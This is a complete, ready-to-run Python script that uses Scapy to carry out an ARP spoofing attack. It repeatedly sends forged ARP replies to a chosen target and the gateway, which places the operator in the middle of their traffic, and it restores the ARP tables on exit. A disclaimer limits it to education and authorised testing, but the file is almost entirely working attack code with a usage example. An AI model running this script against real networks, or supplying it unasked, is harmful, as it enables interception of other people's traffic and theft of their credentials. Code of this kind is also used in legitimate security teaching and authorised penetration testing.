#!/usr/bin/env python3
"""
ARP Spoofing Tool using Scapy
This script performs ARP spoofing/poisoning attack on a local network.

DISCLAIMER: This tool is for educational and authorized testing purposes only.
Unauthorized access to computer networks is illegal.
"""

import scapy.all as scapy
import time
import argparse
import sys


def get_mac(ip):
    """
    Get the MAC address of a given IP address using ARP request.
    
    Args:
        ip (str): Target IP address
        
    Returns:
        str: MAC address of the target IP
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[-] Could not resolve MAC address for {ip}")
        return None


def spoof(target_ip, spoof_ip):
    """
    Send spoofed ARP packets to the target IP.
    
    Args:
        target_ip (str): IP address to spoof for
        spoof_ip (str): IP address to impersonate
    """
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    """
    Restore ARP tables by sending legitimate ARP packets.
    
    Args:
        destination_ip (str): Destination IP
        source_ip (str): Source IP
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, 
                          psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, verbose=False)


def main():
    """Main function to run ARP spoofing attack."""
    parser = argparse.ArgumentParser(
        description="ARP Spoofing tool using Scapy",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example:
  python3 arp_spoof.py -t 192.168.1.100 -g 192.168.1.1
        """
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    
    args = parser.parse_args()
    
    target_ip = args.target
    gateway_ip = args.gateway
    
    print("[*] Starting ARP spoofing...")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Gateway: {gateway_ip}")
    print("[*] Press Ctrl+C to stop...")
    
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print(f"\r[*] Packets Sent: {sent_packets_count}", end="")
            time.sleep(2)
    
    except KeyboardInterrupt:
        print("\n\n[*] Restoring ARP tables...")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[+] ARP Spoof stopped. ARP tables restored.")
        sys.exit(0)
    
    except Exception as e:
        print(f"\n[-] Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
